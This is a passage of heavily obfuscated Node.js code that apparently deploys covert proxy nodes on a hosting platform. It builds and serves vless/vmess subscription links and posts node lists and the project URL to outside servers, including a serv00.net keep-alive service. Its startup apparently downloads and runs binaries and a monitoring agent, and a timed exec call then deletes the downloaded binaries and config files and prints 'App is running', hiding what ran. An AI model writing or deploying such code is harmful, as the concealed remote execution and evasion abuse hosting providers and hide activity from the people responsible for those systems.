_0x5a5796={_0x362a44:0x135,_0x17b432:0x126,_0x5efc2e:0x105,_0x2edad6:0x13d,_0x35654f:0xe6,_0x66592f:0x10a,_0x3346d3:0x129,_0x36c87e:0x152,_0x322291:0xf7},_0xf95128={_0x289338:0x10a,_0x5e0b80:0x14a,_0x1de0f5:0xd5};setTimeout(()=>{const _0x5bb8df=_0x16a9,_0x309042={'v':'2','ps':''+_0x555779,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x35c95a,'path':_0x5bb8df(0x11d),'tls':_0x5bb8df(_0x5a5796._0x362a44),'sni':_0x35c95a,'alpn':'','fp':_0x5bb8df(0x131)},_0x1fb539='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x5bb8df(0xe9)+_0x35c95a+_0x5bb8df(_0x5a5796._0x17b432)+_0x35c95a+_0x5bb8df(0x13f)+_0x555779+_0x5bb8df(0xf6)+Buffer[_0x5bb8df(0x10a)](JSON[_0x5bb8df(_0x5a5796._0x5efc2e)](_0x309042))[_0x5bb8df(0x152)](_0x5bb8df(0x12c))+_0x5bb8df(0x161)+UUID+'@'+CFIP+':'+CFPORT+_0x5bb8df(_0x5a5796._0x2edad6)+_0x35c95a+_0x5bb8df(0x126)+_0x35c95a+_0x5bb8df(_0x5a5796._0x35654f)+_0x555779+'\x0a\x20\x20\x20\x20';console[_0x5bb8df(0xea)](Buffer[_0x5bb8df(_0x5a5796._0x66592f)](_0x1fb539)[_0x5bb8df(0x152)]('base64')),fs[_0x5bb8df(_0x5a5796._0x3346d3)](subPath,Buffer['from'](_0x1fb539)[_0x5bb8df(_0x5a5796._0x36c87e)]('base64')),console[_0x5bb8df(0xea)](FILE_PATH+_0x5bb8df(_0x5a5796._0x322291)),uploadNodes(),app[_0x5bb8df(0x137)]('/'+SUB_PATH,(_0x1567e9,_0x43f208)=>{const _0x3ecb36=_0x5bb8df,_0x4bf4a1=Buffer[_0x3ecb36(_0xf95128._0x289338)](_0x1fb539)[_0x3ecb36(0x152)](_0x3ecb36(0x12c));_0x43f208[_0x3ecb36(0x16f)](_0x3ecb36(_0xf95128._0x5e0b80),_0x3ecb36(_0xf95128._0x1de0f5)),_0x43f208[_0x3ecb36(0x179)](_0x4bf4a1);}),_0x2f01ea(_0x1fb539);},0x7d0);});}}async function uploadNodes(){const _0x1745ae={_0x38224d:0x177,_0x3a8002:0x124,_0x4bc902:0xea,_0x520409:0x130,_0x343654:0x172,_0x3c1f82:0x119,_0x5e7fc8:0x136,_0x25492a:0x102},_0x4eed39=_0x31f0e8;if(UPLOAD_URL&&PROJECT_URL){const _0x5494c5=PROJECT_URL+'/'+SUB_PATH,_0x580fe6={'subscription':[_0x5494c5]};try{const _0x3a9650=await axios[_0x4eed39(_0x1745ae._0x38224d)](UPLOAD_URL+'/api/add-subscriptions',_0x580fe6,{'headers':{'Content-Type':'application/json'}});return _0x3a9650&&_0x3a9650[_0x4eed39(_0x1745ae._0x3a8002)]===0xc8?(console[_0x4eed39(_0x1745ae._0x4bc902)](_0x4eed39(0x168)),_0x3a9650):null;}catch(_0x3fe61b){if(_0x3fe61b['response']){if(_0x3fe61b[_0x4eed39(0x142)][_0x4eed39(0x124)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4eed39(_0x1745ae._0x520409)](listPath))return;const _0x5806ad=fs[_0x4eed39(0x166)](listPath,'utf-8'),_0x3d9e86=_0x5806ad[_0x4eed39(_0x1745ae._0x343654)]('\x0a')['filter'](_0x2711d4=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x2711d4));if(_0x3d9e86[_0x4eed39(_0x1745ae._0x3c1f82)]===0x0)return;const _0x26431d=JSON[_0x4eed39(0x105)]({'nodes':_0x3d9e86});try{const _0xf15bc9=await axios[_0x4eed39(_0x1745ae._0x38224d)](UPLOAD_URL+_0x4eed39(_0x1745ae._0x5e7fc8),_0x26431d,{'headers':{'Content-Type':'application/json'}});return _0xf15bc9&&_0xf15bc9[_0x4eed39(0x124)]===0xc8?(console[_0x4eed39(0xea)](_0x4eed39(_0x1745ae._0x25492a)),_0xf15bc9):null;}catch(_0x3cd6f9){return null;}}else return;}}function cleanFiles(){const _0x360ae3={_0x3f27bb:0xed,_0x5f35b4:0x138,_0x2b620b:0x12d},_0x3ab514={_0x550eff:0xd1,_0x492966:0xea};setTimeout(()=>{const _0x1b29ed={_0x7a0ca5:0xd1,_0x43c2de:0x11b},_0x1bb808=_0x16a9,_0x32d3af=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x32d3af[_0x1bb808(0xed)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x32d3af[_0x1bb808(_0x360ae3._0x3f27bb)](phpPath);process[_0x1bb808(_0x360ae3._0x5f35b4)]===_0x1bb808(0x13a)?exec(_0x1bb808(_0x360ae3._0x2b620b)+_0x32d3af[_0x1bb808(0x174)]('\x20')+_0x1bb808(0xfc),_0x2b3f51=>{const _0x3f502b=_0x1bb808;console[_0x3f502b(_0x1b29ed._0x7a0ca5)](),console['log']('App\x20is\x20running'),console[_0x3f502b(0xea)](_0x3f502b(_0x1b29ed._0x43c2de));}):exec(_0x1bb808(0xdd)+_0x32d3af[_0x1bb808(0x174)]('\x20')+'\x20>/dev/null\x202>&1',_0x2bfd30=>{const _0x27497e=_0x1bb808;console[_0x27497e(_0x3ab514._0x550eff)](),console[_0x27497e(_0x3ab514._0x492966)]('App\x20is\x20running'),console[_0x27497e(_0x3ab514._0x492966)](_0x27497e(0x11b));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x12e7de={_0x16b51c:0x177,_0x55b966:0x171},_0x3c6631=_0x31f0e8;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x3c6631(0xea)](_0x3c6631(0x12b));return;}try{const _0x2a4acc=await axios[_0x3c6631(_0x12e7de._0x16b51c)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x3c6631(0x116)}});return console[_0x3c6631(0xea)]('automatic\x20access\x20task\x20added\x20successfully'),_0x2a4acc;}catch(_0x537816){return console[_0x3c6631(0x160)](_0x3c6631(0x148)+_0x537816[_0x3c6631(_0x12e7de._0x55b966)]),null;}}function _0x16a9(_0xa6fc4c,_0x30ac89){const _0x458665=_0x4586();return _0x16a9=function(_0x16a9e6,_0x564618){_0x16a9e6=_0x16a9e6-0xce;let _0x2b1fa8=_0x458665[_0x16a9e6];return _0x2b1fa8;},_0x16a9(_0xa6fc4c,_0x30ac89);}async function startserver(){const _0x258f3b={_0x59b98e:0x160,_0x49b75e:0x18e},_0x317fac=_0x31f0e8;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3e05f4){console[_0x317fac(_0x258f3b._0x59b98e)](_0x317fac(_0x258f3b._0x49b75e),_0x3e05f4);}}startserver()[_0x31f0e8(0x10f)](_0x29fc0f=>{const _0x1d6066={_0x18688d:0x160},_0xb21275=_0x31f0e8;console[_0xb21275(_0x1d6066._0x18688d)](_0xb21275(0x13c),_0x29fc0f);}),app[_0x31f0e8(0x143)](PORT,()=>console[_0x31f0e8(0xea)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
